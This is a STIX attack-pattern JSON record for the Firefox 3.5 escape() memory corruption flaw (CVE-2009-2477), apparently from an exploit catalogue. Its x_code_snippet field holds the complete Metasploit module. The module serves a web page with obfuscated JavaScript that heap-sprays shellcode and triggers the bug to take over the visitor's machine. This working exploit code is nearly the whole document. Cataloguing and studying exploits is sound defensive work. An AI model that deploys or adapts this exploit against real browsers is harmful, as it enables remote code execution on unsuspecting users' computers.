{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2b4f82a4-7ecd-4a65-a1f9-5056f9ffa13c",
    "created": "2024-08-14T17:05:33.483844Z",
    "modified": "2024-08-14T17:05:33.483848Z",
    "name": "Firefox 3.5 escape() Return Value Memory Corruption",
    "description": " This module exploits a memory corruption vulnerability in the Mozilla Firefox browser. This flaw occurs when a bug in the javascript interpreter fails to preserve the return value of the escape() function and results in uninitialized memory being used instead. This module has only been tested on Windows, but should work on other platforms as well with the current targets.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/firefox_escape_retval.rb",
            "external_id": "firefox_escape_retval.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-2477"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=503286"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  #\n  # This module acts as an HTTP server\n  #\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #  :ua_name => HttpClients::FF,\n  #  :ua_minver => \"3.5\",\n  #  :ua_maxver => \"3.5\",\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :javascript => true,\n  #  :rank => NormalRanking, # reliable memory corruption\n  #  :vuln_test => nil,\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Firefox 3.5 escape() Return Value Memory Corruption',\n      'Description'    => %q{\n          This module exploits a memory corruption vulnerability in the Mozilla\n        Firefox browser. This flaw occurs when a bug in the javascript interpreter\n        fails to preserve the return value of the escape() function and results in\n        uninitialized memory being used instead. This module has only been tested\n        on Windows, but should work on other platforms as well with the current\n        targets.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Simon Berry-Byrne <x00050876[at]itnet.ie>',  # Author / Publisher / Original exploit\n          'hdm',                                        # Metasploit conversion\n        ],\n      'References'     =>\n        [\n          ['CVE', '2009-2477'],\n          ['OSVDB', '55846'],\n          ['BID', '35660'],\n          ['URL', 'https://bugzilla.mozilla.org/show_bug.cgi?id=503286']\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 1000 + (rand(256).to_i * 4),\n          'BadChars' => \"\\x00\",\n        },\n      'Platform'       => %w{ win osx },\n      'Targets'        =>\n        [\n          [ 'Firefox 3.5.0 on Windows XP SP0-SP3',\n            {\n              'Platform'   => 'win',\n              'Arch'       => ARCH_X86,\n              'Ret'        => 0x0c0c0c0c,\n              'BlockLen'   => 0x60000,\n              'Containers' => 800,\n            }\n          ],\n          [ 'Firefox 3.5.0 on Mac OS X 10.5.7 (Intel)',\n            {\n              'Platform' => 'osx',\n              'Arch' => ARCH_X86,\n              'Ret'  => 0x41414141,\n              'BlockLen' => 496,\n              'Containers' => 800000\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-07-13'\n      ))\n  end\n\n\n  def on_request_uri(cli, request)\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    print_status(\"Sending #{self.name}\")\n    send_response_html(cli, generate_html(p), { 'Content-Type' => 'text/html; charset=utf-8' })\n    handler(cli)\n  end\n\n  def generate_html(payload)\n\n    enc_code = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n    enc_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(target.arch))\n    enc_ret  = Rex::Text.to_unescape(\n      Rex::Arch.endian(target.arch) == ENDIAN_LITTLE ? [target.ret].pack('V') : [target.ret].pack('N')\n    )\n\n    var_data_str1 = Rex::Text.rand_text_alpha(3)\n    var_data_str2 = Rex::Text.rand_text_alpha(4)\n    js = <<-EOF\nvar xunescape = unescape;\nvar shellcode = xunescape(\"#{enc_code}\");\n\noneblock = xunescape(\"#{enc_ret}\");\n\nvar fullblock = oneblock;\nwhile (fullblock.length < #{target['BlockLen']})\n{\n  fullblock += fullblock;\n}\n\nvar sprayContainer = new Array();\nvar sprayready = false;\nvar sprayContainerIndex = 0;\n\nfunction fill_function()\n{\n  if(! sprayready) {\n    for (xi=0; xi<#{target['Containers']}/100; xi++, sprayContainerIndex++)\n    {\n      sprayContainer[sprayContainerIndex] = fullblock + shellcode;\n    }\n  } else {\n    DataTranslator();\n    GenerateHTML();\n  }\n  if(sprayContainer.length >= #{target['Containers']}) {\n    sprayready = true;\n  }\n}\n\nvar searchArray = new Array();\n\nfunction escapeData(data)\n{\n  var xi;\n  var xc;\n  var escData='';\n  for(xi=0; xi<data.length; xi++)\n  {\n    xc=data.charAt(xi);\n    if(xc=='&' || xc=='?' || xc=='=' || xc=='%' || xc==' ') xc = escape(xc);\n      escData+=xc;\n  }\n  return escData;\n}\n\nfunction DataTranslator()\n{\n  searchArray = new Array();\n  searchArray[0] = new Array();\n  searchArray[0][\"#{var_data_str1}\"] = \"#{var_data_str2}\";\n  var newElement = document.getElementById(\"content\");\n  if (document.getElementsByTagName) {\n    var xi=0;\n    pTags = newElement.getElementsByTagName(\"p\");\n    if (pTags.length > 0)\n      while (xi < pTags.length)\n        {\n          oTags = pTags[xi].getElementsByTagName(\"font\");\n          searchArray[xi+1] = new Array();\n          if (oTags[0])   {\n            searchArray[xi+1][\"#{var_data_str1}\"] = oTags[0].innerHTML;\n          }\n          xi++;\n        }\n  }\n}\n\nfunction GenerateHTML()\n{\n  var xhtml = \"\";\n  for (xi=1;xi<searchArray.length;xi++)\n  {\n    xhtml += escapeData(searchArray[xi][\"#{var_data_str1}\"]);\n  }\n}\n\nsetInterval(\"fill_function()\", .5);\nEOF\n\n    # Obfuscate it up a bit\n    js = obfuscate_js(js, 'Symbols' => {\n      'Variables' => %W{ DataTranslator GenerateHTML escapeData xunescape\n        shellcode oneblock fullblock sprayContainer xi searchArray xc\n        escData xhtml pTags oTags newElement sprayready sprayContainerIndex\n        fill_function }\n    }).to_s\n\n    str1 = Rex::Text.rand_text_alpha(20)\n    str2 = Rex::Text.rand_text_alpha(24)\n    str3 = Rex::Text.rand_text_alpha(10) + \"  \"\n\n    return %Q^\n<html>\n<head>\n<div id=\"content\">\n<p>\n<FONT>\n</FONT>\n</p>\n<p>\n<FONT>#{str1}</FONT></p>\n<p>\n<FONT>#{str2}</FONT>\n</p>\n<p>\n<FONT>#{str3}</FONT>\n</p>\n</div>\n<script language=\"JavaScript\">\n#{js}\n</script>\n</body>\n</html>\n^\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-07-13",
    "x_mitre_platforms": [
        "osx'"
    ]
}